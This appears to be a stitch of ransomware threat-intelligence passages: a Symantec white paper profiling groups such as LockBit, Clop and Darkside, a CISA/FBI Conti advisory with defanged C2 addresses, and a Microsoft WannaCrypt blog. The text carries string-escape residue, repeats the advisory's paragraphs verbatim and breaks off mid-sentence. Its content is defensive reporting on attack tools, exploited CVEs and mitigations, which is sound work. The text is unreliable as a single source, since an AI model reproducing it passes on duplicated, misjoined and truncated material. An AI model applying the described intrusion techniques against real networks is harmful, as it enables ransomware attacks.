Foreign Assets Control (OFAC) in 2019, which prohibited \nvictims from making payments to the threat group.\n\nhttps://www.justice.gov/opa/pr/russian-national-charged-decade-long-series-hacking-and-bank-fraud-offenses-resulting-tens\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/wastedlocker-ransomware-us\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/wastedlocker-ransomware-us\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nAt the time of writing, the group is reportedly regularly renaming its ransomware due to fears that victims will \nnot pay lest they violate U.S. sanctions. Hades was later rebranded as Phoenix Locker and, as of June 2021, was \nreportedly using the name PayloadBin, which is already associated with the Babuk group, presumably to fool \nvictims into thinking they’d been infected by another actor.\n\nThysanura\n\nAliases: Avaddon \n\nRansomware families: Avaddon \n\nActive since: 2019\n\nActive since at least 2019, Thysanura is known for mounting targeted ransomware campaigns against large \norganizations. The group frequently compromises victims using remote access login credentials—such as RDP and \nVirtual Private Networks (VPN).\n\nThysanura operates on a RaaS model, which is advertised on Russian-language cyber-crime forums. The group uses \nmultiple extortion tactics to pressure victims into paying. \n\nAs well as encrypting files, it will also threaten to leak information stolen from victims and in January 2021, it began \ntelling victims that didn’t pay a ransom that it would hit them with distributed denial of service (DDoS) attacks. To \ndate, it has yet to be confirmed if the group has ever followed through on this threat. \n\nAfter the attackers gain access to a victim’s network, they map the network and identify backups for deletion and/\nor encryption. The following tools are used by attackers using Avaddon to compromise victims:\n\n•\t PowerShell\n\n•\t WMIC.exe (WMI -Windows Management Instrumentation)\n\n•\t Svchost.exe (Service host system process)\n\n•\t Taskhost.exe (Host protocol)\n\nOn June 11, 2021, the group announced it was shutting down its operation and released the decryption keys for \nits victims. The gang sent news outlet Bleeping Computer almost three thousand decryption keys, after which \nthe security firm Emsisoft produced a free, public decryption tool. At the time of writing, it remains unclear as to \nwhether the group’s departure is permanent.\n\nSyrphid\n\nAliases: LockBit \n\nRansomware families: Lockbit \n\nActive since: 2019\n\nThe LockBit ransomware first appeared in September 2019 when it was initially known as ABCD, after the file \nextension it was using on encrypted files. In January 2020, Syrphid expanded its operations by shifting to a RaaS \nbusiness model through the creation of an affiliate program. \n\nAttackers using LockBit are known to compromise organizations using brute-force attacks against web servers \nrunning an outdated VPN service. It has also been reported to use mass vulnerability scanning, phishing, and \ncredential stuffing as vectors. It also reportedly buys access to already-compromised servers on underground \nforums.\n\nIn some cases, the attackers will brute forced administrator credentials in order to traverse the network. They have \nalso been known to use post-exploitation frameworks, for privilege escalation and lateral movement.\n\nBefore encrypting files, Syrphid will attempt to identify sensitive data on the target network and export it to an \nexternal hosting service. Affiliates use a unique build of the ransomware for each victim organization. \n\nAttacks involving Lockbit increased markedly in July 2021 and there is some evidence to suggest that Syrphid was \nattempting recruit former Sodinokibi affiliates (see Case Study: Shifting allegiances among affiliates).\n\nhttps://www.bleepingcomputer.com/news/security/avaddon-ransomware-shuts-down-and-releases-decryption-keys/\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nSnakefly\n\nAliases: Clop \n\nRansomware families: Clop \n\nActive since: 2019\n\nSnakefly is known for developing the Clop ransomware and frequently leverages distribution channels owned \nby Hispid (aka Evil Corp). The group has been linked to some high-profile incidents, including an attack on the \nUniversity of Maastricht in 2019.\n\nThe group’s attacks generally begin with a malicious email that is sent from a previously compromised account \nto make it more convincing. This email contains an HTML attachment that redirects to a compromised website \nthat then delivers a document containing a malicious macro that drops the Get2 loader. This then downloads the \nSDBot malware or other remote access tools (RATs) to assist the attackers in moving laterally across the network, \nexfiltrate data, and download the Clop ransomware.\n\nSome of the ransomware payloads have a signed certificate that can help them appear legitimate and potentially \nbypass security measures. Once Clop is executed, it searches for security products to delete. It has been seen by \na third party deleting or stopping security products from Malwarebytes, ESET, and Microsoft. The ransomware \nencrypts files and adds a .clop extension to infected files, before placing a ransom note on the machine.\n\nIt is also known to exfiltrate data from victims prior to encryption and threaten to release it unless a ransom is paid. \nLike most ransomware groups these days, the group also runs a Clop data leaks website where it publishes data \nstolen from victims who have refused to pay a ransom.\n\nCoreid\n\nAliases: Darkside \n\nRansomware Families: Darkside, BlackMatter (unconfirmed) \n\nActive since: 2020\n\nCoreid was, for a brief period of time, one of the most prolific targeted ransomware threats and was used in a \nnumber of ambitious attacks, most notably the May 2021 attack on Colonial Pipeline that disrupted fuel supplies to \nthe East Coast of the U.S. \n\nCoreid operated under a RaaS model, working with affiliates to conduct ransomware attacks and takes a share of \nthe profits. Like most ransomware actors, attacks linked to Coreid steal victims’ data and the group then threatens \nto publish it to further pressure victims into paying the ransom demand. \n\nOnce on a victim’s network, attackers using Darkside generally begin exfiltrating data, credentials, and other \nsensitive information. The attackers also attempt to move laterally across the network to gain access to the domain \ncontroller (DC). Once on the DC they exfiltrate sensitive information and also used PowerShell to download the \nDarkSide binary.\n\nThe attackers are known to create a shared folder using the company’s name on the DC itself, and copy the \nDarkside binary to it. Subsequently, the attackers use BITSAdmin to distribute the ransomware binary from the \nshared folder to other computers on the network. \n\nCoreid affiliates use TOR to communicate with victims and manage administration of the ransomware. Coreid \nreportedly encourage their affiliates to request Monero in ransomware demands, presumably due to that \ncryptocurrency’s high level of anonymity.\n\nCoreid appeared to become inactive following the Colonial attack after some of its infrastructure was taken offline. \n\nIn late July 2021, media reports linked Coreid to a new ransomware threat named BlackMatter. The ransomware \nis believed to use the same encryption routines as used by Darkside. In an interview with Recorded Future, \nBlackMatter’s developer denied the link, saying “we are familiar with the Darkside team from working together \nin the past but we are not them, although we are intimate with their ideas.” However, Blockchain analysis firm \nChainalysis also found financial links between the two threats and concluded that BlackMatter was created by \nCoreid. Symantec’s assessment is that it is too early yet to make a definitive attribution on BlackMatter.\n\nhttps://www.bleepingcomputer.com/news/security/darkside-ransomware-gang-returns-as-new-blackmatter-operation/\nhttps://therecord.media/an-interview-with-blackmatter-a-new-ransomware-group-thats-learning-from-the-mistakes-of-darkside-and-revil/\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nHornworm\n\nAliases: RagnarLocker, Viking Spider \n\nRansomware Families: RagnarLocker \n\nActive since: 2020\n\nHornworm is associated with the RagnarLocker ransomware. RagnarLocker first appeared in early 2020 and was \nthe subject of an FBI flash alert in November 2020. The FBI reported that it had encrypted computers on a large \ncorporation’s network and demanded an $11 million ransom, threatening to release 10 TB of stolen data if the \nransom wasn’t paid. Since then, it has mounted ransomware attacks against a range of other organizations in the \nUnited States.\n\nIn a bid to avoid detection, RagnarLocker is reported to be deployed as a full virtual machine on each infected \ncomputer. In some cases, the payload was delivered in an MSI package, which includes a working installation \nof an old Oracle VirtualBox (Sun xVM VirtualBox version 3.0.4) and a virtual disk image file (VDI) named micro.\nvdi— an image of a stripped-down version of the Windows XP SP3 operating system, called MicroXP v0.82. The \nimage includes a 49 kB ransomware payload. While Hornworm may have pioneered this tactic, Symantec has since \nobserved attackers using other payloads also attempt to run them from virtual machines.\n\nRagnarLocker appends encrypted files with the extension .RGNR_<ID>, where <ID> is a hash of the computer’s \nNETBIOS name. The attackers, identifying themselves as RAGNAR_LOCKER, leave a .txt ransom note on \ncomputers, with instructions on how to pay the ransom and receive a decryption key. The group is known to \nfrequently change obfuscation techniques and has VMProtect, UPX, and custom packing algorithms. \n\nHornworm reportedly exfiltrates data from victim organizations prior to encryption and threatens to release this \ndata unless a ransom is paid. It uses a dedicated data leak website for this purpose, hosted on Tor.\n\n \n\nCase Study: Hornworm Collaboration with FIN8\n\nHornworm may have established a relationship with \nthe FIN8 cyber-crime gang. In early 2021, FIIN8 was \nseen deploying the RagnarLocker ransomware onto \nmachines it had compromised in a financial services \ncompany in the U.S., the first time Symantec had \nseen FIN8 installing ransomware on machines it has \ncompromised. \n\nBADHATCH malware, which is known to be used \nby the FIN8 group, was launched on computers at \nthe organization via PowerShell in January 2021. \nMultiple PowerShell scripts were downloaded from \nthe abused legitimate sslip[.]io service, which is \nknown to be used by FIN8. PowerShell was also used \nto download unknown content from a WMI object. \nFIN8 uses PowerShell to deploy malicious tools onto \nvictim machines.\n\nA keylogger was also deployed and executed. \nIn February 2021, three-and-a-half weeks after \nsuspicious activity was first seen on the network, \nthe open-source tool Rclone was used to exfiltrate \ndata. Just under one month later, in mid-March, the \nRagnarLocker ransomware was dropped on the \nnetwork by another tool known as Safebitsloader.\n\nWhile it is possible that the FIN8 and RagnarLocker \nactivity on this network was carried out separately by \ntwo different actors, several things indicate that this \nwasn’t the case. This includes that both BADHATCH \nand Rclone were downloaded from the same IP \naddress, and both the ransomware and PowerShell \nscripts were downloaded to the same directory \n(%WINDIR%\\temp) on infected computers.\n\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-virtual-machines\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nLeaftier\n\nAliases: Babuk \n\nRansomware Families: Babuk \n\nActive since: 2021\n\nFirst finding public attention in early 2021, Leaftier is notable for its heavy focus on data breach extortion. The \ngroup initially operated under an RaaS business model and used double extortion tactics, stealing data from victims \nas well as encrypting files. However, Leaftier later announced that it was foregoing encryption and focusing only on \ndata theft as a way to extort money from victims. \n\nBabuk was found to have a high degree of similarities with another ransomware threat called Vasa Locker. A Vasa \nsample analyzed by McAfee shared approximately 86% of the same codebase as Babuk and was compiled one \nmonth before the first release of Babuk. It is likely that the actors behind Babuk and Vasa Locker are one and the \nsame, or have strong links to one another.\n\nIn late April 2021, Leaftier announced that it was closing its affiliate program and moving to an extortion model \nthat did not rely on encrypting victim computers. The group said it would instead focus on demanding ransoms for \ninformation stolen from its victims.\n\nIn May 2021, Leaftier announced the development of a platform for “independent leaks” which would be a data leak \nwebsite for other actors to use. At the same time the group rebranded, changing the name on its new leak website \n(Payload.bin) from Babuk to Payload Bin.\n\nIn early July 2021, it was reported that Leaftier had seemingly returned to using ransomware to target corporate \nnetworks. The gang began using a new version of its Babuk ransomware (Babuk v.2.0) and moved to a new data \nleak website.\n\nLeaffolder\n\nAliases: Maze, Egregor \n\nRansomware Families: Maze, Egregor \n\nActive since: 2019\n\nThe first evidence of Leaffolder activity dates from May 2019, with the appearance of the Maze ransomware. \nLeaffolder is best known for pioneering the tactic of exfiltrating data from victim organizations prior to encryption \nand threatening to release this data unless the ransom is paid. The tactic was quickly copied by a range of other \ntargeted ransomware groups.\n\nMaze’s main distribution channels were the Fallout and Spelevo exploit kits, with victims being directed to them \nvia spam email campaigns. Once the attackers gain access to a single computer on a network, they download the \ncommodity malware Cobalt Strike and the Metasploit Framework in order to move laterally across the network and \nenumerate machines. \n\nIn October 2020, Leaffolder announced that it was shutting down the Maze ransomware operation. The group was \nsubsequently linked to a new ransomware operation known as Egregor, which appeared shortly after Maze was \nretired. Many former Maze affiliates migrated to using Egregor. \n\nAffiliates of Egregor were subject to a law enforcement operation in February 2021. Egregor is believed to have \nbecome inactive since this occurred.\n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nCanthroid\n\nAliases: UNC2447 \n\nRansomware: Thieflock \n\nActive Since: 2021\n\nCanthroid first appeared in early 2021 when it began performing targeted ransomware attacks using Thieflock. It as \noperates an RaaS program. \n\nTo date, it is known for compromising victims using the exploit of a zero-day vulnerability in Sonicwall VPN (CVE-\n2021-20016). The vulnerability was patched in February 2021, but Canthroid has continued to attack organizations \nusing unpatched versions of the software. Successful exploit allows the attacker to create their own credentials and \njoin the target’s network.\n\nOnce inside the network, the group has been observed using SoftPerfect Network Scanner, a publicly available tool \nused for discovery of hostnames and network services. It is also known to use SombRAT, a custom remote access \ntool which allows the attackers to download further tools and maintain communications with a C&C server.\n\nPrior to encryption, the group is known to exfiltrate data from the target’s network. The attackers are reported to \nuse pCloud, an encrypted cloud storage service.\n\nTools, Tactics, and Procedures\nMost ransomware attacks are a multi-staged process and targeted ransomware attacks in particular usually involve \na large number of steps and a significant level of interaction on the part of the attackers. An array of tools, tactics, \nand procedures (TTPs) are employed to infiltrate the victim’s network, steal credentials, elevate privileges, move \nlaterally across the network, and deploy a ransomware payload on multiple computers. \n\nKnowing the TTPs used by ransomware attackers allows network defenders to better understand how their \norganizations could be compromised and can provide some guidance on prioritization of defensive measures. \nFor example, the Windows tools such as PsExec are frequently abused by attackers and reducing the number of \naccounts with administrator privileges whilst increasing protection on administrator accounts may mitigate the risk \nof a successful attack. \n\nTable 1: Most Frequently Seen Ransomware TTPs, April 2021 – June 2021\n\nTTP Percentage of Ransomware Investigations\n\nCobalt Strike 41%\n\nPsExec 33%\n\nNetscan 15%\n\nMimikatz 15%\n\nAdfind 15%\n\nWeirdloop 11%\n\nIcedID 11%\n\nSystemBC 7%\n\nProcDump 7%\n\nNsudo 7%\n\nDisable Defender 7%\n\nDelete Shadow Copies 7%\n\nWMI 4%\n\nrclone 4%\n\nQakbot 4%\n\nBITSAdmin 4%\n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nBy examining the results of recent ransomware investigations where precursor tools were found, Symantec was \nable to obtain a picture of which were the most commonly used TTPs in ransomware attacks. While the most \nfrequently employed tool was the commodity malware Cobalt Strike (seen in 41% of investigations), a large \nproportion of the list was taken up by freely available, dual-use tools or operating system features, such as PsExec \nand WMI.\n\n•\t Cobalt Strike: An off-the-shelf tool that can be used to execute commands, inject other processes, elevate \ncurrent processes, or impersonate other processes, and upload and download files. It ostensibly has \nlegitimate uses as a penetration testing tool but is invariably exploited by malicious actors.\n\n•\t PsExec: Microsoft Sysinternals tool for executing processes on other systems. The tool is primarily used by \nattackers to move laterally on victim networks.\n\n•\t Netscan: SoftPerfect Network Scanner, a publicly available tool used for discovery of hostnames and network \nservices.\n\n•\t Mimikatz: Freely available tool capable of changing privileges, exporting security certificates, and recovering \nWindows passwords in plaintext depending on the configuration.\n\n•\t Adfind: A free tool that can be used to query Active Directory.\n\n•\t Weirdloop: Weirdloop, CobaltStrike HTTPS Stager loader used in some attacks involving Ryuk during 2021.\n\n•\t IcedID: Botnet malware that was originally developed as a financial Trojan but is now frequently working in \ncollaboration with ransomware attackers. \n\n•\t SystemBC: Commodity malware which can open a backdoor on the infected computer and use the SOCKS5 \nproxy protocol to communicate with a C&C server. \n\n•\t ProcDump: Microsoft Sysinternals tool for monitoring an application for CPU spikes and generating crash \ndumps, but which can also be used as a general process dump utility.\n\n•\t Nsudo: Open-source system management tool that can be abused to elevate privileges. \n\n•\t Windows Management Instrumentation (WMI) (wmic.exe): Microsoft command-line tool that can be used to \nexecute commands on remote computers.\n\n•\t Qakbot: Botnet malware that was originally developed as a financial Trojan.\n\n•\t BITSAdmin: A Microsoft command-line tool that can be used to create download or upload jobs and monitor \ntheir progress.\n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nCase Study: Ransomware Supply Chain Attack\n\nWhile targeted ransomware attacks have proved to \nbe highly lucrative for attackers, it hasn’t stopped \nthem from continuously refining tactics. The major \ninnovation of 2020 was the practice of stealing \ndata prior to encrypting computers on the network \nand then threatening to publish this data unless the \nransom is paid. The threat of a data breach increases \nthe pressure on victim organizations to pay. It also \nprovides the attackers with leverage over victims who \nmay have been in a position to restore encrypted \nsystems from backups. \n\nIn July 2021, attackers using the Sodinokibi \nransomware experimented with a new tactic: \ndelivering ransomware through a supply chain \nattack. The attack involved the exploitation of a \nzero-day vulnerability (CVE-2021-30116) in Kaseya \nVSA software, which was used to compromise victim \norganizations via multiple Managed Service Providers \n(MSPs) who use the software.\n\nThe ransomware is believed to have infected at least \n1,500 organizations worldwide. Much of the process \nappeared to be automated and the ransomware was to \ntrigger simultaneously across multiple organizations, \npresumably to give victims no forewarning of the \nattack. The attack may have been timed to coincide \nwith the 4th of July holiday weekend in the U.S., where \nmany organizations may be lightly staffed.\n\nThe attackers used the exploit to deliver a malicious \nscript and an ASCII PEM named agent.crt to Kaseya \nVSA clients. The dropper masqueraded inside the \nASCII PEM file, which was decoded using Certutil after \n\nattempts to disable Microsoft Defender. It dropped \ntwo resources, an old, but legitimate copy of Windows \nDefender (MsMpEng.exe) and a custom malicious \nloader. The dropper wrote the two files to disk and \nexecuted MsMpEng.exe which then side-loaded and \nexecuted the custom loader’s export (mpsvc.dll).\n\nIt remains to be seen whether the attack is the \nbeginning of a new trend. The nature of the attack \nmeant that it may have been somewhat less effective \nthan “traditional” targeted ransomware attacks. \nThe automated nature of the attack meant that the \nattackers had to forego some of the standard steps \ntaken in such attacks, such as the exfiltration of data \nand the deletion of backups. \n\nLeafroller, the group behind Sodinokibi, went offline \nless than two weeks after the attack. The reason for \nthis disappearance remains unclear and it is unknown \nif it was a coincidence or linked in any way to the \nKaseya attack. \n\nSeveral weeks after the attack Kaseya said that it had \nacquired a universal decryptor for the ransomware. \nThe company said that it had acquired the decryptor \nfrom a «trusted third party» and was now sharing it \nwith affected customers. \n\nFollowing the attack, the attackers reported \ndemanding $70 million for a universal decryptor, $5 \nmillion for a decryptor for each MSP, or $40,000 for \neach encrypted computer. Kaseya said that it could \nneither confirm nor deny whether it had paid a ransom \nto obtain the decryption tool. \n\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30116\nhttps://www.bleepingcomputer.com/news/security/kaseya-obtains-universal-decryptor-for-revil-ransomware-victims/\nhttps://www.bleepingcomputer.com/news/security/kaseya-obtains-universal-decryptor-for-revil-ransomware-victims/\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nInfection Vectors\nTargeted ransomware groups use a diverse range of distribution methods. Because of the relatively low prevalence \nof targeted ransomware attacks, the infection vector can sometimes be difficult to establish. Targeted ransomware \ngroups often take their cues from espionage groups in their methods for gaining a foothold on the victim’s \nnetwork.\n\nSecondary Infections\n\nOver the past twelve months, this has quickly become one of the most prevalent means of access for ransomware \ngroups. Generally speaking, it involves malware that is distributed using mass-mailing botnets, since it provides \nransomware groups with a large pool of potential victims. Trojans that were once used for financial fraud, such as \nTrickbot, have recently been used mainly as distribution channels for other malware, most notably ransomware.\n\nIn some cases, ransomware attackers already control the botnets, such as the Miner group, which owns the Trickbot \nbotnet. Trickbot has been seen as a precursor to attacks by Ryuk, which is attributed to Miner. Similarly, Hispid have \nleveraged their own Dridex botnet, which was originally built to mount financial attacks, to give them a means of \ndelivering the ransomware to organizations. \n\nOther actors have since attempted to replicate this attack pattern, seeking collaborations with established botnet \noperators. The most notable of these is the use of IcedID by at least one affiliate operator of the Conti ransomware \n(see Case Study: IcedID and Conti collaboration). \n\nCase Study: IcedID and Conti Collaboration\n\nSeveral recent investigations by Symantec into \nattacks involving the Conti ransomware found \na consistent attack chain in multiple attacks, \nsuggesting that at least one attacker using Conti had \nbegun to collaborate with the IcedID botnet. \n\nThe first evidence of malicious activity in targeted \norganizations was the presence of IcedID on the \ntarget’s network. IcedID was then used to deliver \n\nmalware known as Longlist, which in turn is used to \ninstall Cobalt Strike. Other tools used in the attack \nincluded the publicly available credential dumping \ntool LaZagne and Adfind, a free dual-use tool that \ncan be used to query Active Directory. \n\nWhile IcedID is widely distributed malware, its \npresence along with these other tools is likely to \nsuggest a ransomware attack in preparation.\n\nPhishing\n\nPhishing is one of the most widely utilized infection vectors, with emails sent to employees disguised as work-\nrelated correspondence (invoices, delivery confirmation etc.). Some phishing campaigns may be indiscriminate, \na wide-ranging trawl for victims of interest. In other cases, attackers may pre-select their victim and send spear-\nphishing emails to selected employees in the organization. \n\nSpear-phishing campaigns may be tailored to the target, using subject matter relevant to the organization’s \nbusiness. If the recipient is tricked into opening a malicious attachment or following a malicious link, malware will be \ndownloaded to the victim’s machine, allowing the attackers to begin moving across the victim’s network.\n\nMalvertising\n\nHitherto not known as an infection vector for ransomware, malvertising was leveraged during 2020 by the \noperators of WastedLocker. The group has been observed compromising media websites in order to serve \nmalicious ads containing a JavaScript-based framework known as SocGholish which masquerades as a software \nupdate.\n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nVulnerability Exploitation\n\nAnother route onto an organization’s network is exploiting vulnerable software running on public-facing servers.  \nIn most cases to date, zero-day vulnerabilities have not been used and the attackers exploited known vulnerabilities \nin unpatched software, such as JBoss or Apache web server. One of the primary users of this tactic was the now \ndefunct SamSam group, which ceased operations in November 2019. More recently, the Canthroid group is known \nfor compromising victims using the exploit of a zero-day vulnerability in Sonicwall VPN (CVE-2021-20016), while \nthe Proxylogon Exchange Server vulnerability was also leveraged by several actors to perform ransomware attacks.\n\nPoorly Secured Services\n\nAnother infection vector comes from compromising poorly secured services. Crysis (aka Dharma) has repeatedly \nbeen observed attacking organizations through poorly secured RDP services, taking advantage of leaked or weak \ncredentials. The now defunct GandCrab group was observed scanning the internet for exposed MySQL databases \nthat it was then infecting with malware.\n\nProtection\nHow Symantec Solutions Can Help\nThe Symantec Enterprise Business provides a comprehensive portfolio of security solutions to address today’s \nsecurity challenges and protect data and digital infrastructure from multifaceted threats.

Only allow RDP from specific known IP addresses and ensure you are using \nmulti-factor authentication (MFA).\n\n•\t Implement proper audit and control of administrative account usage. You could also implement one-time \ncredentials for administrative work to help prevent theft and misuse of admin credentials.\n\n•\t Create profiles of usage for admin tools. Many of these tools are used by attackers to move laterally \nundetected through a network.\n\n•\t Use application whitelisting where applicable.\n\n•\t Locking down PowerShell can increase security, for example with the constrained language mode.\n\n•\t Make credential dumping more difficult, for example by enabling credential guard in Windows 10 or disabling \nSeDebugPrivilege.\n\n•\t MFA can help limit the usefulness of compromised credentials.\n\n•\t Create a plan to consider notification of outside parties. In order to ensure correct notification of required \norganizations, such as the FBI or other law enforcement authorities/agencies, be sure to have a plan in place \nto verify.\n\n•\t Create a “jump bag” with hard copies and archived soft copies of all critical administrative information. In \norder to protect against the compromise of the availability of this critical information, store it in a jump bag \nwith hardware and software needed to troubleshoot problems. Storing this information on the network is not \nhelpful when network files are encrypted. \n\nEmail:\n\n•\t Enable MFA to prevent the compromise of credentials during phishing attacks.\n\n•\t Harden security architecture around email systems to minimize the amount of spam that reaches end-user \ninboxes and ensure you are following best practices for your email system, including the use of SPF and other \ndefensive measures against phishing attacks.\n\nBackup:\n\n•\t Implement offsite storage of backup copies. Arrange for offsite storage of at least four weeks of weekly full \nand daily incremental backups. \n\n•\t Implement offline backups that are onsite. Make sure you have backups that are not connected to the \nnetwork to prevent them from being encrypted by ransomware.\n\n•\t Verify and test your server-level backup solution. This should already be part of your Disaster Recovery \nprocess.\n\n•\t Secure the file-level permissions for backups and backup databases. Don’t let your backups get encrypted.\n\n•\t Test restore capability. Ensure restore capabilities support the needs of the business.\n\nhttps://www.broadcom.com/products/cyber-security\n\n\tIntroduction\n\tRansomware Trends\n\tCompounding the Threat: Ransomware-as-a-Service\n\tRansomware Threat Actors\n\tMiner\n\tCase Study: Social Engineering Element in BazarLoader Attacks\n\n\tLeafroller\n\tHispid\n\tThysanura\n\tSyrphid\n\tSnakefly\n\tCoreid\n\tCase Study: Hornworm Collaboration with FIN8\n\n\tHornworm\n\tLeaftier\n\tLeaffolder\n\tCanthroid\n\n\tTools, Tactics, and Procedures\n\tInfection Vectors\n\tSecondary Infections\n\tMalvertising\n\tVulnerability Exploitation\n\tPoorly Secured Services\n\n\tProtection\n\tMitigation",

Notable attack vectors include Trickbot and\nCobalt Strike (see below for details).\nWhile there are no specific or credible cyber threats to the U.S. homeland at this time, CISA, FBI,\nNSA, and the United States Secret Service (USSS) encourage organizations to review this advisory\nand apply the recommended mitigations.\n(end of update)\nThe Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation\n(FBI) have observed the increased use of Conti ransomware in more than 400 attacks on U.S. and\ninternational organizations. (See FBI Flash: Conti Ransomware Attacks Impact Healthcare and First\nResponder Networks.) In typical Conti ransomware attacks, malicious cyber actors steal files, encrypt\nservers and workstations, and demand a ransom payment.\n\nTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact\nyour local FBI field office at www.fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at\n855-292-3937 or by email at CyWatch@fbi.gov.

See the ATT&CK for Enterprise for all referenced threat actor\ntactics and techniques.\n\nTECHNICAL DETAILS\nWhile Conti is considered a ransomware-as-a-service (RaaS) model ransomware variant, there is\nvariation in its structure that differentiates it from a typical affiliate model. It is likely that Conti\ndevelopers pay the deployers of the ransomware a wage rather than a percentage of the proceeds\nfrom a successful attack.\nConti actors often gain initial access [TA0001] to networks through:\n•\n\nSpearphishing campaigns using tailored emails that contain malicious attachments\n[T1566.001] or malicious links [T1566.002];\no Malicious Word attachments often contain embedded scripts that can be used to\ndownload or drop other malware—such as TrickBot and IcedID, and/or Cobalt Strike—\nto assist with lateral movement and later stages of the attack life cycle with the\neventual goal of deploying Conti ransomware.[1],[2],[3]\n\n•\n•\n•\n•\n•\n\nStolen or weak Remote Desktop Protocol (RDP) credentials [T1078];[4]\nPhone calls;\nFake software promoted via search engine optimization;\nOther malware distribution networks (e.g., ZLoader); and\nCommon vulnerabilities in external assets.\n\nIn the execution phase [TA0002], actors run a getuid payload before using a more aggressive\npayload to reduce the risk of triggering antivirus engines.

Notable attack vectors include Trickbot and\nCobalt Strike (see below for details).\nWhile there are no specific or credible cyber threats to the U.S. homeland at this time, CISA, FBI,\nNSA, and the United States Secret Service (USSS) encourage organizations to review this advisory\nand apply the recommended mitigations.\n(end of update)\nThe Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation\n(FBI) have observed the increased use of Conti ransomware in more than 400 attacks on U.S. and\ninternational organizations. (See FBI Flash: Conti Ransomware Attacks Impact Healthcare and First\nResponder Networks.) In typical Conti ransomware attacks, malicious cyber actors steal files, encrypt\nservers and workstations, and demand a ransom payment.\n\nTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact\nyour local FBI field office at www.fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at\n855-292-3937 or by email at CyWatch@fbi.gov.

See the ATT&CK for Enterprise for all referenced threat actor\ntactics and techniques.\n\nTECHNICAL DETAILS\nWhile Conti is considered a ransomware-as-a-service (RaaS) model ransomware variant, there is\nvariation in its structure that differentiates it from a typical affiliate model. It is likely that Conti\ndevelopers pay the deployers of the ransomware a wage rather than a percentage of the proceeds\nfrom a successful attack.\nConti actors often gain initial access [TA0001] to networks through:\n•\n\nSpearphishing campaigns using tailored emails that contain malicious attachments\n[T1566.001] or malicious links [T1566.002];\no Malicious Word attachments often contain embedded scripts that can be used to\ndownload or drop other malware—such as TrickBot and IcedID, and/or Cobalt Strike—\nto assist with lateral movement and later stages of the attack life cycle with the\neventual goal of deploying Conti ransomware.[1],[2],[3]\n\n•\n•\n•\n•\n•\n\nStolen or weak Remote Desktop Protocol (RDP) credentials [T1078];[4]\nPhone calls;\nFake software promoted via search engine optimization;\nOther malware distribution networks (e.g., ZLoader); and\nCommon vulnerabilities in external assets.\n\nIn the execution phase [TA0002], actors run a getuid payload before using a more aggressive\npayload to reduce the risk of triggering antivirus engines. CISA and FBI have observed Conti actors\nusing Router Scan, a penetration testing tool, to maliciously scan for and brute force [T1110] routers,\ncameras, and network-attached storage devices with web interfaces. Additionally, actors use\nKerberos attacks [T1558.003] to attempt to get the Admin hash to conduct brute force attacks.\nConti actors are known to exploit legitimate remote monitoring and management software and remote\ndesktop software as backdoors to maintain persistence [TA0003] on victim networks.[5] The actors\nuse tools already available on the victim network—and, as needed, add additional tools such as\nWindows Sysinternals and Mimikatz—to obtain users’ hashes and clear-text credentials, which\nenable the actors to escalate privileges [TA0004] within a domain and perform other post-exploitation\nand lateral movement tasks [TA0008]. In some cases, the actors also use TrickBot malware to carry\nout post-exploitation tasks.\n\nPage 2 of 10 | Product ID: AA21-265A\n\nTLP:WHITE\n\nCISA | FBI | NSA | USSS\n\nTLP:WHITE\nAccording to a recently leaked threat actor “playbook,”[6] Conti actors also exploit vulnerabilities in\nunpatched assets, such as the following, to escalate privileges [TA0004] and move laterally [TA0008]\nacross a victim’s network:\n•\n•\n•\n\n2017 Microsoft Windows Server Message Block 1.0 server vulnerabilities;[7]\n\"PrintNightmare\" vulnerability (CVE-2021-34527) in Windows Print spooler service;[8] and\n\"Zerologon\" vulnerability (CVE-2020-1472) in Microsoft Active Directory Domain Controller\nsystems.[9]\n\nArtifacts leaked with the playbook identify four Cobalt Strike server Internet Protocol (IP) addresses\nConti actors previously used to communicate with their command and control (C2) server.\n•\n•\n•\n•\n\n162.244.80[.]235\n85.93.88[.]165\n185.141.63[.]120\n82.118.21[.]1\n\nCISA and FBI have observed Conti actors using different Cobalt Strike server IP addresses unique to\ndifferent victims.\nConti actors often use the open-source Rclone command line program for data exfiltration [TA0010].\nAfter the actors steal and encrypt the victim's sensitive data [T1486], they employ a double extortion\ntechnique in which they demand the victim pay a ransom for the release of the encrypted data and\nthreaten the victim with public release of the data if the ransom is not paid.\n\nINDICATORS OF COMPROMISE\nUpdated March 9, 2022:\nThe following domains have registration and naming characteristics similar to domains used by\ngroups that have distributed Conti ransomware.

While security updates are automatically applied in most computers, some users and\nenterprises may delay deployment of patches. Unfortunately, the ransomware, known as WannaCrypt, appears\nto have affected computers that have not applied the patch for these vulnerabilities. While the attack is unfolding,\nwe remind users to install MS17-010 if they have not already done so.\n\nThe trend towards increasingly sophisticated malware behavior, highlighted by the use of exploits and other\nattack vectors, makes older platforms so much more susceptible to ransomware attacks. From June to\nNovember 2017, Windows 7 devices were 3.4 times more likely to encounter ransomware compared to\nWindows 10 devices.\nRead our latest report: A worthy upgrade: Next-gen security on Windows 10 proves resilient against\nransomware outbreaks in 2017\n\nMicrosoft antimalware telemetry immediately picked up signs of this campaign. Our expert systems gave us\nvisibility and context into this new attack as it happened, allowing Windows Defender Advanced Threat Protection\n(ATP) to deliver real-time defense. Through automated analysis, machine learning, and predictive modeling, we\nwere able to rapidly protect against this malware.\n\nIn this blog, we provide an early analysis of the end-to-end ransomware attack. Please note this threat is still\nunder investigation. The attack is still active, and there is a possibility that the 